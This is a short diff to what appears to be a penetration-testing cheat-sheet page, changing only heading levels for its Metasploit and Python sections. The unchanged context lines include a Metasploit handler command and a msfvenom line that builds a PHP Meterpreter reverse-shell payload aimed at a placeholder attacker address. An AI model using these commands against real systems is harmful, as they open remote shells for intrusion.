@@ -4,7 +4,7 @@ layout: page
 permalink: /snippets
 ---
 
-### Metasploit
+## Metasploit
 #### Handlers
 ```bash 
 msf6 > use exploit/multi/handler
@@ -27,7 +27,7 @@ msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port
 
 <br/>
 
-### Python
+## Python
 #### Spawn a terminal
 
 ```python
